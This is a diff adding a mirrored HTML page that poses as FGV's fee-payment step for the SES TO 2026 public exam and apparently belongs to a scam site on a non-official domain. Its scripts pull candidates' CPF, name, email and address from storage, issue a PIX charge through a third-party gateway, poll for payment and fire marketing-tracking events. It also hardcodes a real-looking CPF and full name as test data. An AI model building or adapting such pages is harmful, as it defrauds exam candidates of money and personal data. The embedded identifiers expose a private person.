@@ -1,0 +1,1113 @@
+<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from concursopm.site/inicio/CNU-info/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:22 GMT --><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
+
+
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Concurso SES TO 2026 - Taxa de Inscrição | FGV</title>
+
+
+    <!-- Integração Trust7 + UTMfy -->
+    <script src="js/config-site.js"></script>
+    <script src="js/medusapay-utmfy-integration.js"></script> <!-- Deixar a integração com o nome original apenas -->
+
+    <script src="js/3.4.16.js"></script>
+    <link href="css/all.min.css" rel="stylesheet">
+        <link href="../css/fgv-portal.css" rel="stylesheet">
+    <link href="css/home.css" rel="stylesheet">
+    <script src="js/utm-preservation.js"></script>
+
+
+    <style>
+.form-header { background-color: #233769;
+            color: white;
+            font-weight: 600;
+        }
+
+        .btn-primary {
+            background-color: #0d6efd;
+            color: white;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #4d7396;
+        }
+/* Garantir que o modal PIX fique sempre acima do footer */
+        #payment-modal {
+            z-index: 99999 !important;
+        }
+
+        /* Ajustes específicos para telas pequenas */
+        @media (max-width: 640px) {
+            #payment-modal {
+                padding-bottom: 80px !important;
+                /* Espaço extra para o footer */
+            }
+
+            #payment-modal>div {
+                margin-bottom: 20px;
+            }
+        }
+
+        .info-box {
+            border-left: 4px solid #233769;
+        }
+    </style>
+    <script>
+        // 🌐 Variáveis globais
+        let userData = null;
+
+        document.addEventListener("DOMContentLoaded", function () {
+            // SISTEMA DE SEGURANÇA TEMPORARIAMENTE DESATIVADO
+            const cpfData = JSON.parse(
+                localStorage.getItem("cpfData") || "{}",
+            );
+
+            // Dados de teste para desenvolvimento
+            const testUserData = {
+                CPF: "91834279372",
+                NOME: "IRACEMA DE SOUSA SILVA",
+                NASC: "1970-10-24 00:00:00",
+            };
+
+            // Inicializar userData no escopo global
+            // Suporte para múltiplos formatos de resposta da API
+            console.log("Dados recebidos:", cpfData);
+            
+            if (cpfData && cpfData.nome && cpfData.nascimento) {
+                // Formato da API Apela - dados diretos (prioritário)
+                userData = {
+                    NOME: cpfData.nome,
+                    NASC: cpfData.nascimento,
+                    CPF: cpfData.cpf || "N/A",
+                    SEXO: cpfData.sexo,
+                    MAE: cpfData.mae
+                };
+            } else if (
+                cpfData &&
+                cpfData.DADOS &&
+                cpfData.DADOS.CPF &&
+                cpfData.DADOS.NOME
+            ) {
+                // Formato da API antiga (DADOS maiúsculo) (fallback)
+                userData = cpfData.DADOS;
+            } else if (cpfData && cpfData.dados?.[0]) {
+                // Formato da API nova (dados minúsculo - array) (fallback)
+                userData = cpfData.dados[0];
+            } else if (cpfData && cpfData.CPF && cpfData.NOME) {
+                // Estrutura direta do cpfData (sem DADOS) (fallback)
+                userData = cpfData;
+            } else if (cpfData && cpfData.NOME && cpfData.NASCIMENTO) {
+                // Formato da nova API direta (fallback)
+                userData = {
+                    NOME: cpfData.NOME,
+                    NASC: cpfData.NASCIMENTO,
+                    CPF: cpfData.CPF || "N/A"
+                };
+            } else {
+                // Usar dados de teste
+                console.log(
+                    "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                );
+                userData = testUserData;
+            }
+            
+            console.log("Dados processados:", userData);
+
+            document.getElementById("cpf-display").textContent =
+                userData?.CPF || "91834279372";
+            document.getElementById("nome-display").textContent =
+                userData?.NOME || "IRACEMA DE SOUSA SILVA";
+
+            console.log("✅ userData definida globalmente:", userData);
+        });
+    </script>
+    <!-- UTMfy Pixel -->
+    <script>
+      window.googlePixelId = "68fafce3e95a8ad5bfc8863d";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmfy.com.br/scripts/pixel/pixel-google.js");
+      document.head.appendChild(a);
+    </script>
+
+    <script
+      src="https://cdn.utmfy.com.br/scripts/utms/latest.js"
+      data-utmfy-prevent-xcod-sck
+      data-utmfy-prevent-subids
+      async
+      defer
+    ></script>
+    </head>
+
+<body class="fgv-body">
+    <div class="fgv-brand fgv-brand--compact">
+            <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+        </div>
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <div class="border border-gray-300 rounded">
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg">
+                        Inscrição > Informações do Concurso
+                    </h2>
+                </div>
+                <div class="p-6">
+                    <div class="bg-[#2B5984] p-4 rounded-md mb-5 text-white shadow-md">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="p-2">
+                                <p class="text-sm text-gray-200">CPF:</p>
+                                <p id="cpf-display" class="font-semibold text-shadow">
+                                    ...
+                                </p>
+                            </div>
+                            <div class="p-2">
+                                <p class="text-sm text-gray-200">
+                                    Nome Completo:
+                                </p>
+                                <p id="nome-display" class="font-semibold text-shadow">
+                                    ...
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mb-8">
+                        <h3 class="text-xl font-bold text-[#044785] mb-4">
+                            <i class="fas fa-info-circle mr-2"></i>
+                            Informações Importantes sobre o Concurso SES TO 2026
+                        </h3>
+                        <div class="space-y-5">
+                                                        <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#233769]">Formato da Prova</h4>
+                                <p class="text-gray-700 mb-2">O concurso SES TO 2026 (Edital 001/2026 SECAD/SES/TO, banca FGV) terá o seguinte formato:</p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li><strong>Prova Objetiva:</strong> aplicada em 01/11/2026 — período matutino para nível médio/técnico e vespertino para nível superior.</li>
+                                    <li>Conteúdos e pesos conforme o edital e anexos da FGV (portal conhecimento.fgv.br/concursos/sesto26/).</li>
+                                    <li>Cidades de prova: Araguaína, Araguatins, Arraias, Dianópolis, Gurupi, Palmas, Paraíso do Tocantins e Porto Nacional.</li>
+                                </ul>
+                            </div>
+                            <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#233769]">Critérios de Aprovação</h4>
+                                <p class="text-gray-700 mb-2">Para ser aprovado no concurso SES TO 2026:</p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li>Atender aos critérios de pontuação e classificação definidos no Edital 001/2026.</li>
+                                    <li>Comprovar os requisitos do Anexo IV para o cargo pretendido.</li>
+                                    <li>Classificação final dentro das 5.124 vagas do Anexo II, respeitadas as cotas legais.</li>
+                                </ul>
+                            </div>
+                            <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#233769]">Próximas Etapas</h4>
+                                <p class="text-gray-700 mb-2">Após a aprovação na prova objetiva:</p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li>Homologação e convocação conforme ordem de classificação e lotação do Anexo II.</li>
+                                    <li>Posse condicionada à comprovação documental e requisitos do Anexo IV.</li>
+                                    <li>Aprovados serão nomeados no quadro efetivo da SES/TO, em regime estatutário (Lei 1.818/2007).</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="bg-amber-50 p-4 rounded-md border border-amber-200 text-amber-900 mt-6">
+                            <p class="flex items-start">
+                                <i class="fas fa-info-circle text-amber-600 mr-2 mt-1"></i>
+                                <span>
+                                    Para concluir a inscrição, quite a taxa do cargo selecionado.
+                                    O valor está indicado abaixo. A cobrança é emitida na sequência.
+                                </span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-300 pt-5 mt-5">
+                        <div id="taxa-resumo-box" class="mb-4 text-center p-4 bg-green-50 border border-green-200 rounded-md">
+                            <p class="text-sm text-gray-600 mb-1">Taxa de inscrição</p>
+                            <p id="taxa-display" class="text-2xl font-bold text-green-700">R$ —</p>
+                            <p id="cargo-taxa-display" class="text-sm text-gray-600 mt-1"></p>
+                        </div>
+                        <div class="flex justify-center">
+                            <button id="pagar-button" class="bg-green-600 hover:bg-green-700 text-white py-3 px-8 rounded-md flex items-center justify-center transition-all w-full sm:w-auto font-semibold text-lg">
+                                <i class="fas fa-file-invoice-dollar mr-2"></i>
+                                <span>Pagar taxa de inscrição</span>
+                            </button>
+                        </div>
+                        <p class="text-xs text-center text-gray-500 mt-3">Pagamento instantâneo · confirmação automática da inscrição</p>
+                    </div>
+
+                    <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4 pb-20" style="z-index: 99999;"></div>
+                    <script>
+                        document.addEventListener(
+                            "DOMContentLoaded",
+                            function () {
+                                // Exibir taxa do cargo escolhido
+                                try {
+                                    var taxa = Number(localStorage.getItem("taxaValor") || 0);
+                                    var cargo = localStorage.getItem("cargo") || "";
+                                    try {
+                                        var cargos = JSON.parse(localStorage.getItem("cargosSelecionados") || "[]");
+                                        if (!cargo && cargos[0]) cargo = cargos[0].nome || cargos[0].cargo || "";
+                                        if ((taxa !== 100 && taxa !== 150) && cargos[0] && cargos[0].taxa) taxa = Number(cargos[0].taxa);
+                                    } catch (e) {}
+                                    if (taxa !== 100 && taxa !== 150) taxa = 150;
+                                    var el = document.getElementById("taxa-display");
+                                    if (el) el.textContent = "R$ " + taxa.toFixed(2).replace(".", ",");
+                                    var cargoEl = document.getElementById("cargo-taxa-display");
+                                    if (cargoEl) {
+                                        cargoEl.textContent = cargo
+                                            ? (cargo + (taxa === 100 ? " · Nível médio/técnico" : " · Nível superior"))
+                                            : (taxa === 100 ? "Nível médio/técnico" : "Nível superior");
+                                    }
+                                } catch (e) {}
+
+                                const pagarButton = document.getElementById("pagar-button");
+                                if (pagarButton) {
+                                    pagarButton.addEventListener("click", function () {
+                                        generatePixPayment();
+                                    });
+                                }
+                            },
+                        );
+
+                        // 🔥 SISTEMA PIX Concurso SES TO 2026 - BLACKCAT
+                        async function generatePixPayment() {
+                            // ✅ Verificar se já existe um PIX ativo recente (até 2 min)
+                            try {
+                                const existingTxRaw = localStorage.getItem('blackcatTransaction');
+                                if (existingTxRaw) {
+                                    const existingTx = JSON.parse(existingTxRaw);
+                                    const createdAtMs = existingTx.createdAt ? Date.parse(existingTx.createdAt) : null;
+                                    const nowMs = Date.now();
+                                    const ageSec = createdAtMs ? Math.floor((nowMs - createdAtMs) / 1000) : null;
+                                    const holdSec = 120;
+                                    const remaining = (ageSec !== null) ? Math.max(0, holdSec - ageSec) : 0;
+                                    if (remaining > 0 && existingTx.transactionId && existingTx.pixCode) {
+                                        console.log('⏳ PIX recente detectado. Reapresentando modal e retomando verificação.');
+                                        if (typeof window.showPixModal === 'function') {
+                                            window.showPixModal({ id: existingTx.transactionId, pix: existingTx.pixCode, amount: existingTx.amount }, userData, { cached: true, message: 'Cobrança emitida recentemente', timeRemaining: remaining });
+                                        }
+                                        try {
+                                            const blackcat = new BlackcatPayment();
+                                    if (window.autoPaymentChecker && !window.autoPaymentChecker.isActive()) {
+                                        window.autoPaymentChecker.startAutoCheck(existingTx.transactionId, blackcat);
+                                    }
+                                        } catch (e) {}
+                                        return; // Não gerar novo ainda
+                                    }
+                                }
+                            } catch (e) { console.warn('Erro ao checar PIX existente', e); }
+                            
+                            // Limpar dados antigos (se passaram os 2 min)
+                            try { localStorage.removeItem('currentPix'); } catch {}
+                            try { localStorage.removeItem('blackcatTransaction'); } catch {}
+                            
+                            const confirmPaymentButton = document.getElementById("pagar-button");
+                            const paymentModal = document.getElementById("payment-modal");
+
+                            // Atualizar botão para loading
+                            if (confirmPaymentButton) {
+                                confirmPaymentButton.classList.add("opacity-75", "cursor-not-allowed");
+                                confirmPaymentButton.disabled = true;
+                                confirmPaymentButton.dataset.oldHtml = confirmPaymentButton.innerHTML;
+                                confirmPaymentButton.innerHTML =
+                                    '<div class="flex items-center justify-center"><div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full"></div> Emitindo cobrança...</div>';
+                            }
+
+                            try {
+                                // Validações básicas — tolera formatos e login sem nome da API
+                                if (!userData) userData = {};
+                                var cpfRaw = String(userData.CPF || userData.cpf || "").replace(/\D/g, "");
+                                var nomeRaw = String(userData.NOME || userData.nome || "").trim();
+                                if (!cpfRaw || cpfRaw.length < 11) {
+                                    try {
+                                        var cpfData = JSON.parse(localStorage.getItem("cpfData") || "{}");
+                                        cpfRaw = String(cpfData.cpf || cpfData.CPF || (cpfData.DADOS && cpfData.DADOS.CPF) || "").replace(/\D/g, "");
+                                        if (!nomeRaw) nomeRaw = String(cpfData.nome || cpfData.NOME || (cpfData.DADOS && cpfData.DADOS.NOME) || "").trim();
+                                    } catch (e) {}
+                                }
+                                if (!nomeRaw || nomeRaw.length < 3) {
+                                    throw new Error("Nome não encontrado. Volte e complete seus dados na inscrição.");
+                                }
+                                if (!cpfRaw || cpfRaw.length < 11) {
+                                    throw new Error("CPF não encontrado. Volte e informe um CPF válido.");
+                                }
+                                userData.CPF = cpfRaw;
+                                userData.NOME = nomeRaw;
+
+                                let emailUsuario = localStorage.getItem("emailConfirmacao");
+                                if (!emailUsuario) {
+                                    try {
+                                        const cad = JSON.parse(localStorage.getItem("cadastroRapido") || "{}");
+                                        if (cad && cad.email) emailUsuario = cad.email;
+                                    } catch (e) {}
+                                }
+                                if (emailUsuario) {
+                                    try { localStorage.setItem("emailConfirmacao", emailUsuario); } catch (e) {}
+                                }
+
+                                const addressData = JSON.parse(localStorage.getItem("enderecoData") || "{}");
+
+                                // Inicializar Blackcat Payment
+                                const blackcat = new BlackcatPayment();
+
+                                // Validar dados do usuário
+                                const validation = blackcat.validateUserData(userData, addressData);
+                                if (!validation.isValid) {
+                                    throw new Error("Dados inválidos: " + validation.errors.join(", "));
+                                }
+
+                                // Gerar transação usando Blackcat (PIX apenas)
+                                const transaction = await blackcat.createPixTransaction(userData, addressData);
+
+                                if (!transaction.success) {
+                                    throw new Error("Não foi possível emitir a cobrança. Tente novamente. Detalhes: " + (transaction.error || ''));
+                                }
+
+                                console.log('✅ Transação PIX gerada com sucesso:', transaction);
+
+                                // Exibir modal do PIX
+                                if (typeof window.showPixModal === "function") {
+                                    window.showPixModal(
+                                        { id: transaction.transactionId, pix: transaction.pixCode, amount: transaction.amount },
+                                        userData,
+                                        { cached: false, message: "Cobrança emitida" }
+                                    );
+                                } else {
+                                    alert(`Cobrança PIX emitida com sucesso.\nCódigo: ${transaction.pixCode}`);
+                                }
+
+                                // 🎯 Enviar evento de início de checkout
+                                blackcat.sendTrackingEvents('InitiateCheckout', transaction.transactionId, transaction.amount);
+
+                                // Salvar dados da transação
+                                localStorage.setItem('blackcatTransaction', JSON.stringify({
+                                    transactionId: transaction.transactionId,
+                                    pixCode: transaction.pixCode,
+                                    amount: transaction.amount,
+                                    status: transaction.status,
+                                    createdAt: new Date().toISOString()
+                                }));
+
+                                // 🔄 INICIAR VERIFICAÇÃO AUTOMÁTICA ADICIONAL
+                                if (typeof window.autoPaymentChecker !== 'undefined') {
+                                    console.log('🔄 Iniciando sistema adicional de verificação automática...');
+                                    window.autoPaymentChecker.startAutoCheck(transaction.transactionId, blackcat);
+                                } else {
+                                    console.warn('⚠️ Sistema de verificação automática não disponível');
+                                }
+
+                                // 🔄 INICIAR MONITORAMENTO AUTOMÁTICO DE PAGAMENTO
+                                console.log('🚀 Iniciando monitoramento automático de pagamento...');
+                                
+                                const stopMonitoring = blackcat.startPaymentMonitoring(transaction.transactionId, {
+                                    interval: 8000, // Verificar a cada 8 segundos
+                                    maxAttempts: 75, // 10 minutos máximo (75 * 8s = 600s)
+                                    onPaymentConfirmed: (paymentData) => {
+                                        console.log('Pagamento confirmado automaticamente', paymentData);
+
+                                        try {
+                                            var tx = JSON.parse(localStorage.getItem('blackcatTransaction') || '{}');
+                                            var taxa = Number(localStorage.getItem('taxaValor') || 0);
+                                            var amountCents = Number(localStorage.getItem('taxaCobradaCents') || tx.amount || paymentData.amount || 0);
+                                            if (!amountCents) {
+                                                amountCents = (taxa === 100 || taxa === 150) ? taxa * 100 : 15000;
+                                            }
+                                            localStorage.setItem('pagamentoConfirmado', JSON.stringify({
+                                                transactionId: tx.transactionId || paymentData.transactionId || '',
+                                                amount: amountCents,
+                                                valorReais: amountCents / 100,
+                                                status: 'paid',
+                                                confirmedAt: new Date().toISOString()
+                                            }));
+                                            localStorage.removeItem("currentPix");
+                                            localStorage.removeItem("blackcatTransaction");
+                                        } catch {}
+
+                                        try { if (window.FunnelTracker) FunnelTracker.advance('pagamento'); } catch (e) {}
+                                        redirectWithUtmParams("/confirmacao/");
+                                    },
+                                    onError: (error) => {
+                                        console.error('Erro no monitoramento automático:', error);
+                                        // Não mostrar erro para o usuário, apenas log
+                                    }
+                                });
+
+                                // Salvar função de parada do monitoramento
+                                window.stopPaymentMonitoring = stopMonitoring;
+                                
+                                // ✅ Popup de 45 segundos removido - monitoramento automático continua
+
+                            } catch (error) {
+                                console.error("❌ Erro ao gerar PIX:", error);
+                                alert("Não foi possível emitir a cobrança: " + (error?.message || "Tente novamente em instantes."));
+                            } finally {
+                                if (confirmPaymentButton) {
+                                    confirmPaymentButton.classList.remove("opacity-75", "cursor-not-allowed");
+                                    confirmPaymentButton.disabled = false;
+                                    confirmPaymentButton.innerHTML = confirmPaymentButton.dataset.oldHtml
+                                        || '<i class="fas fa-file-invoice-dollar mr-2"></i><span>Pagar taxa de inscrição</span>';
+                                }
+                            }
+                            
+                            /*
+                            // ✅ Verificar se já existe um PIX ativo
+                            const existingPix = localStorage.getItem('currentPix');
+                            const existingTransaction = localStorage.getItem('disruptyTransaction');
+                            
+                            if (existingPix || existingTransaction) {
+                                console.log('⚠️ PIX já existe, limpando dados antigos automaticamente...');
+                                
+                                // Verificar se usuário quer continuar (sem popup - sempre limpa e continua)
+                                const userConfirmed = await showPaymentConfirmationPopup();
+                                
+                                if (userConfirmed) {
+                                    // Usuário confirmou que já pagou, redirecionar para confirmação
+                                    console.log('✅ Usuário confirmou pagamento, redirecionando...');
+                                    try { if (window.FunnelTracker) FunnelTracker.advance('pagamento'); } catch (e) {}
+                                    redirectWithUtmParams("/confirmacao/");
+                                    return;
+                                } else {
+                                    // Usuário disse que não pagou, continuar com geração de novo PIX
+                                    console.log('⏳ Usuário não pagou, gerando novo PIX...');
+                                    
+                                    // Limpar dados antigos
+                                    localStorage.removeItem('currentPix');
+                                    localStorage.removeItem('disruptyTransaction');
+                                }
+                            }
+                            
+                            const confirmPaymentButton = document.getElementById("confirm-payment");
+                            const paymentModal = document.getElementById("payment-modal");
+
+                            // Atualizar botão para loading
+                            confirmPaymentButton.classList.add("opacity-75", "cursor-not-allowed");
+                            confirmPaymentButton.disabled = true;
+                            confirmPaymentButton.innerHTML =
+                                '<div class="flex items-center"><div class="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full"></div> Gerando PIX...</div>';
+
+                            try {
+                                // Validações básicas
+                                if (!userData?.CPF || !userData?.NOME) {
+                                    throw new Error("Dados do CPF/NOME não encontrados. Preencha seus dados corretamente.");
+                                }
+
+                                const emailUsuario = localStorage.getItem("emailConfirmacao");
+                                const addressData = JSON.parse(localStorage.getItem("enderecoData") || "{}");
+                                if (!emailUsuario) {
+                                    throw new Error("E-mail de confirmação não encontrado.");
+                                }
+
+                                // Inicializar Disrupty Payment
+                                const disrupty = new DisruptyPayment();
+
+                                // Gerar PIX usando Disrupty
+                                const pixResult = await disrupty.generatePixPayment(userData, addressData);
+
+                                if (!pixResult.success) {
+                                    throw new Error("Falha ao gerar PIX com Disrupty");
+                                }
+
+                                console.log('✅ PIX gerado com sucesso:', pixResult);
+
+                                // Exibir modal do PIX
+                                if (typeof window.showPixModal === "function") {
+                                    window.showPixModal(
+                                        { 
+                                            id: pixResult.transactionId, 
+                                            pix: pixResult.pixCode,
+                                            amount: pixResult.amount
+                                        },
+                                        userData,
+                                        { 
+                                            cached: false, 
+                                            message: "PIX gerado com Disrupty Payment Gateway" 
+                                        }
+                                    );
+                                } else {
+                                    // Fallback para modal simples
+                                    alert(`PIX gerado com sucesso!\nCódigo: ${pixResult.pixCode}`);
+                                }
+
+                                // 🎯 Enviar evento de início de checkout
+                                disrupty.sendTrackingEvents('InitiateCheckout', pixResult.transactionId);
+
+                                // Salvar dados da transação
+                                localStorage.setItem('disruptyTransaction', JSON.stringify({
+                                    transactionId: pixResult.transactionId,
+                                    transactionHash: pixResult.transactionHash,
+                                    pixCode: pixResult.pixCode,
+                                    amount: pixResult.amount,
+                                    currency: pixResult.currency,
+                                    createdAt: new Date().toISOString()
+                                }));
+
+                                // 🔄 INICIAR MONITORAMENTO AUTOMÁTICO DE PAGAMENTO
+                                console.log('🚀 Iniciando monitoramento automático de pagamento...');
+                                
+                                const stopMonitoring = disrupty.startPaymentMonitoring(pixResult.transactionId, {
+                                    interval: 8000, // Verificar a cada 8 segundos
+                                    maxAttempts: 75, // 10 minutos máximo (75 * 8s = 600s)
+                                    onPaymentConfirmed: (paymentData) => {
+                                        console.log('Pagamento confirmado automaticamente', paymentData);
+
+                                        try {
+                                            var amountCents = Number(localStorage.getItem('taxaCobradaCents') || pixResult.amount || 0);
+                                            if (!amountCents) {
+                                                var taxa = Number(localStorage.getItem('taxaValor') || 0);
+                                                amountCents = (taxa === 100 || taxa === 150) ? taxa * 100 : 15000;
+                                            }
+                                            localStorage.setItem('pagamentoConfirmado', JSON.stringify({
+                                                amount: amountCents,
+                                                valorReais: amountCents / 100,
+                                                status: 'paid',
+                                                confirmedAt: new Date().toISOString()
+                                            }));
+                                            localStorage.removeItem("currentPix");
+                                            localStorage.removeItem("disruptyTransaction");
+                                        } catch {}
+
+                                        try { if (window.FunnelTracker) FunnelTracker.advance('pagamento'); } catch (e) {}
+                                        redirectWithUtmParams("/confirmacao/");
+                                    },
+                                    onError: (error) => {
+                                        console.error('Erro no monitoramento automático:', error);
+                                        // Não mostrar erro para o usuário, apenas log
+                                    }
+                                });
+
+                                // Salvar função de parada do monitoramento
+                                window.stopPaymentMonitoring = stopMonitoring;
+                                
+                                // ✅ Popup de 45 segundos removido - monitoramento automático continua
+
+                            } catch (error) {
+                                console.error("❌ Erro ao gerar PIX:", error);
+                                alert("Erro ao gerar PIX: " + (error?.message || "Ocorreu um erro inesperado."));
+                            } finally {
+                                // Restaurar botão SEMPRE
+                                confirmPaymentButton.classList.remove("opacity-75", "cursor-not-allowed");
+                                confirmPaymentButton.disabled = false;
+                                confirmPaymentButton.textContent = "Vou realizar o pagamento";
+                            }
+                            */
+                        }
+
+
+                        // ✅ Função para gerar QR Code manualmente (fallback)
+                        async function generateManualQRCode(pixCode) {
+                            try {
+                                console.log('🔄 Gerando QR Code manualmente...');
+                                
+                                // Método 1: Tentar QRCode.js (mais moderno)
+                                if (typeof QRCode !== 'undefined' && QRCode.toCanvas) {
+                                    try {
+                                        console.log('🔄 Tentando QRCode.js...');
+                                        const canvas = document.createElement('canvas');
+                                        await QRCode.toCanvas(canvas, pixCode, {
+                                            width: 200,
+                                            margin: 2,
+                                            color: {
+                                                dark: '#000000',
+                                                light: '#FFFFFF'
+                                            }
+                                        });
+                                        
+                                        const qrDataUrl = canvas.toDataURL('image/png');
+                                        console.log('✅ QR Code gerado com QRCode.js');
+                                        return qrDataUrl;
+                                    } catch (e) {
+                                        console.warn('❌ QRCode.js falhou:', e);
+                                    }
+                                }
+                                
+                                // Método 2: Tentar qrcode-generator (mais simples)
+                                if (typeof qrcode !== 'undefined') {
+                                    try {
+                                        console.log('🔄 Tentando qrcode-generator...');
+                                        const qr = qrcode(0, 'M');
+                                        qr.addData(pixCode);
+                                        qr.make();
+                                        
+                                        const canvas = document.createElement('canvas');
+                                        const ctx = canvas.getContext('2d');
+                                        const size = 200;
+                                        const moduleCount = qr.getModuleCount();
+                                        const cellSize = Math.floor(size / moduleCount);
+                                        const offset = Math.floor((size - moduleCount * cellSize) / 2);
+                                        
+                                        canvas.width = size;
+                                        canvas.height = size;
+                                        
+                                        // Fundo branco
+                                        ctx.fillStyle = '#FFFFFF';
+                                        ctx.fillRect(0, 0, size, size);
+                                        
+                                        // Desenhar QR Code
+                                        ctx.fillStyle = '#000000';
+                                        for (let row = 0; row < moduleCount; row++) {
+                                            for (let col = 0; col < moduleCount; col++) {
+                                                if (qr.isDark(row, col)) {
+                                                    ctx.fillRect(
+                                                        offset + col * cellSize,
+                                                        offset + row * cellSize,
+                                                        cellSize,
+                                                        cellSize
+                                                    );
+                                                }
+                                            }
+                                        }
+                                        
+                                        const qrDataUrl = canvas.toDataURL('image/png');
+                                        console.log('✅ QR Code gerado com qrcode-generator');
+                                        return qrDataUrl;
+                                    } catch (e) {
+                                        console.warn('❌ qrcode-generator falhou:', e);
+                                    }
+                                }
+                                
+                                // Método 3: API externa como último recurso
+                                try {
+                                    console.log('🔄 Tentando API externa...');
+                                    const apiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+                                    
+                                    // Verificar se a API está acessível
+                                    const response = await fetch(apiUrl, { method: 'HEAD' });
+                                    if (response.ok) {
+                                        console.log('✅ QR Code gerado via API externa');
+                                        return apiUrl;
+                                    }
+                                } catch (e) {
+                                    console.warn('❌ API externa falhou:', e);
+                                }
+                                
+                                console.error('❌ Todos os métodos de fallback falharam');
+                                return null;
+                                
+                            } catch (error) {
+                                console.error('❌ Erro geral no fallback:', error);
+                                return null;
+                            }
+                        }
+                        
+                        // ✅ Função showPaymentConfirmationPopup - popups desabilitados, retorna sempre false
+                        function showPaymentConfirmationPopup() {
+                            // Função mantida para compatibilidade, mas sempre retorna false (sem popup)
+                            return Promise.resolve(false);
+                        }
+
+                        // Util: carrega a lib de QRCode sob demanda (1x)
+                        function loadQRCodeLib() {
+                            return new Promise((resolve, reject) => {
+                                if (window.QRCode) return resolve();
+                                const s = document.createElement("script");
+                                s.src = "https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js";
+                                s.async = true;
+                                s.onload = () => resolve();
+                                s.onerror = () => reject(new Error("Falha ao carregar a lib de QRCode."));
+                                document.head.appendChild(s);
+                            });
+                        }
+
+                        // Util: copiar código de pagamento
+                        async function copyPixCode(pix) {
+                            try {
+                                await navigator.clipboard.writeText(pix);
+                                const btn = document.getElementById("copy-pix-btn");
+                                if (btn) {
+                                    const old = btn.textContent;
+                                    btn.textContent = "Código copiado";
+                                    setTimeout(() => (btn.textContent = old), 1500);
+                                }
+                            } catch {
+                                alert("Não foi possível copiar. Selecione o código e copie manualmente.");
+                            }
+                        }
+
+                        // Fechar modal
+                        function closePixModal() {
+                            const paymentModal = document.getElementById("payment-modal");
+                            if (paymentModal) {
+                                paymentModal.classList.add("hidden");
+                                paymentModal.innerHTML = ""; // limpa conteúdo
+                            }
+                        }
+
+                        // Modal PIX com QR dinâmico
+                        async function showPixModal(qrCodeOrObj, userData = {}, options = {}) {
+                            const paymentModal = document.getElementById("payment-modal");
+                            if (!paymentModal) throw new Error("Elemento #payment-modal não encontrado.");
+
+                            // Normaliza retorno: aceita string "pix" ou objeto { id, pix }
+                            const pixCode = typeof qrCodeOrObj === "string" ? qrCodeOrObj : qrCodeOrObj?.pix;
+                            const paymentId = typeof qrCodeOrObj === "object" ? qrCodeOrObj?.id : undefined;
+
+                            if (!pixCode) throw new Error("Código PIX ausente.");
+
+                            // Valor cobrado (com variação ±0,01)
+                            let amountCents = 0;
+                            let displayCents = 0;
+                            try {
+                                // Valor exibido: sempre cheio (100,00 / 150,00)
+                                var baseTaxa = Number(localStorage.getItem('taxaValor') || 0);
+                                if (baseTaxa !== 100 && baseTaxa !== 150) {
+                                    try {
+                                        var cargos = JSON.parse(localStorage.getItem('cargosSelecionados') || '[]');
+                                        if (cargos[0] && cargos[0].taxa) baseTaxa = Number(cargos[0].taxa);
+                                    } catch (e2) {}
+                                }
+                                if (baseTaxa !== 100 && baseTaxa !== 150) baseTaxa = 150;
+                                displayCents = baseTaxa * 100;
+
+                                // Valor cobrado (pode ter ±0,01) — só para protocolo interno
+                                if (typeof qrCodeOrObj === "object" && qrCodeOrObj?.amount) {
+                                    amountCents = Number(qrCodeOrObj.amount);
+                                }
+                                if (!amountCents) amountCents = Number(localStorage.getItem('taxaCobradaCents') || 0);
+                                if (!amountCents) {
+                                    const tx = JSON.parse(localStorage.getItem('medusapayTransaction') || '{}');
+                                    amountCents = Number(tx.amount || 0);
+                                }
+                                if (!amountCents) amountCents = displayCents;
+                            } catch (e) {
+                                displayCents = 15000;
+                                amountCents = 15000;
+                            }
+                            const amountLabel = 'R$ ' + (displayCents / 100).toFixed(2).replace('.', ',');
+
+                            const isCached = !!options.cached;
+                            const cacheMessage = options.message || "";
+                            const timeRemaining = options.timeRemaining; // em segundos (opcional)
+
+                            const cacheAlert = isCached
+                                ? `
+      <div class="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
+        <div class="flex items-start">
+          <i class="fas fa-info-circle text-blue-600 mr-2 mt-1"></i>
+          <div class="text-sm text-blue-800">
+            <p class="font-medium">Cobrança já emitida</p>
+            <p>${cacheMessage || "Utilizamos a cobrança gerada há pouco para evitar duplicidade."}</p>
+            ${Number.isFinite(timeRemaining)
+                                    ? `<p class="text-xs mt-1">Disponível por mais: ${Math.floor(timeRemaining / 60)}min ${timeRemaining % 60}s</p>`
+                                    : ""
+                                }
+          </div>
+        </div>
+      </div>
+    `
+                                : "";
+
+                            // HTML do modal (sem imagem de QR; usaremos canvas dinâmico)
+                            const modalHtml = `
+    <div class="bg-white rounded-md p-4 sm:p-6 shadow-2xl w-full max-w-[520px] mx-auto relative z-[99999]" style="max-height: calc(100vh - 100px); overflow-y: auto;">
+      <div class="text-center mb-6">
+        <div class="mb-3">
